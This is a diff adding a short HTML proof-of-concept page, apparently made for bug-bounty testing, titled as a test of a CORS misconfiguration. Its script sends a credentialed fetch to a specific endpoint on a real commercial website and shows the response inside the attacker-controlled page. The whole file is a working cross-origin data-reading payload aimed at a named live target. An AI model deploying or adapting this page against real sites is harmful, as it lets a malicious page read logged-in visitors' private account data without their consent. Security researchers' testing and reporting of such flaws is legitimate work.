@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CORS PoC</title>
+  </head>
+  <body>
+    <h1>Testing CORS Misconfig</h1>
+    <script>
+      fetch("https://www.shopify.com/__dux", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.body.innerHTML += `<pre>${data}</pre>`;
+      })
+      .catch(error => {
+        console.error('Hata:', error);
+        document.body.innerHTML += `<pre>Request failed: ${error}</pre>`;
+      });
+    </script>
+  </body>
+</html>
